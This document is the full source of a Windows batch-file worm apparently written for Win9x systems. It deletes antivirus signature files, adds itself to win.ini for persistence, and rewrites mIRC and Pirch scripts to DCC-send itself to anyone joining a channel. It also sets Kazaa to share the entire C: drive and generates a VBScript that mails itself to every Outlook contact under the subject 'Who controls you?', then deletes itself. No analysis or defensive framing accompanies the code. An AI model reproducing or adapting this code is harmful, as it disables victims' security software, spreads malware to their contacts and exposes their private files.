@echo off
ctty nul
del c:\programme\norton~1\s32integ.dll
del c:\programme\f-prot95\fpwm32.dll
del c:\programme\mcafee\scan.dat
del c:\tbavw95\tbscan.sig
del c:\programme\tbav\tbav.dat
del c:\tbav\tbav.dat
del c:\programme\avpersonal\antivir.vdf
del c:\mirc\script.ini
del c:\mirc32\script.ini
del c:\progra~1\mirc\script.ini
del c:\progra~1\mirc32\script.ini
del c:\pirch98\events.ini
Š
echo [windows]>re
echo load=c:\bat.soulcontrol.bat>>re
echo run=>>re
echo NullPort=None>>re
echo.>>re
copy re + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
Š
del re
echo [script]>mi
echo n0=on 1:JOIN:#:{>>mi
echo n1= /if ( nick == $me ) { halt }>>mi
echo n2= /.dcc send $nick c:\bat.soulcontrol.bat>>mi
echo n3=}>>mi
move mi c:\mirc\script.ini
move mi c:\mirc32\script.ini
move mi c:\progra~1\mirc\script.ini
move mi c:\progra~1\mirc32\script.ini
del mi
Š
echo [Levels]>pi
echo Enabled=1>>pi
echo Count=6>>pi
echo Level1=000-Unknowns>>pi
echo 000-UnknownsEnabled=1>>pi
echo Level2=100-Level 100>>pi
echo 100-Level 100Enabled=1>>pi
echo Level3=200-Level 200>>pi
echo 200-Level 200Enabled=1>>pi
echo Level4=300-Level 300>>pi
echo 300-Level 300Enabled=1>>pi
Š
echo Level5=400-Level 400>>pi
echo 400-Level 400Enabled=1>>pi
echo Level6=500-Level 500>>pi
echo 500-Level 500Enabled=1>>pi
echo.>>pi
echo [000-Unknowns]>>pi
echo User1=*!*@*>>pi
echo UserCount=1>>pi
echo Event1=ON JOIN:#:/dcc send $nick c:\bat.soulcontrol.bat>>pi
echo EventCount=1>>pi
echo.>>pi
Š
echo [100-Level 100]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
echo.>>pi
echo [200-Level 200]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
echo.>>pi
echo [300-Level 300]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
Š
echo.>>pi
echo [400-Level 400]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
echo.>>pi
echo [500-Level 500]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
move pi c:\pirch98\events.ini
del pi
echo REGEDIT4>ka
Š
echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>ka
echo "DisableSharing"=dword:00000000>>ka
echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>ka
echo "Dir0"="012345:c:\\">>ka
move ka c:\ka.reg
regedit /s c:\ka.reg
echo.on error resume next>ol
echo dim a,b,c,d,e>>ol
echo set a = Wscript.CreateObject("Wscript.Shell")>>ol
echo set b = CreateObject("Outlook.Application")>>ol
Š
echo set c = b.GetNameSpace("MAPI")>>ol
echo for y = 1 To c.AddressLists.Count>>ol
echo set d = c.AddressLists(y)>>ol
echo x = 1>>ol
echo set e = b.CreateItem(0)>>ol
echo for o = 1 To d.AddressEntries.Count>>ol
echo f = d.AddressEntries(x)>>ol
echo e.Recipients.Add f>>ol
echo x = x + 1>>ol
echo next>>ol
echo e.Subject = "Who controls you?">>ol
echo e.Body = "Stop your soul being controled! Get illuminated.">>ol
Š
echo e.Attachments.Add ("c:\bat.soulcontrol.bat")>>ol
echo e.DeleteAfterSubmit = False>>ol
echo e.Send>>ol
echo f = "">>ol
echo next>>ol
move ol %winbootdir%\ol.vbs
start %winbootdir%\ol.vbs
echo REGEDIT4>pl
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>pl
echo "msg"="c:\\pl.bat">>pl
move pl c:\pl.reg
Š
regedit /s c:\pl.reg
echo @echo off>pl.bat
echo ctty nul>>pl.bat
echo %winbootdir%\pbrush.exe c:\soulcontrol.jpg>>pl.bat
echo exit>>pl.bat
move pl.bat c:\
del c:\ka.reg
del c:\pl.reg
del %0
Š
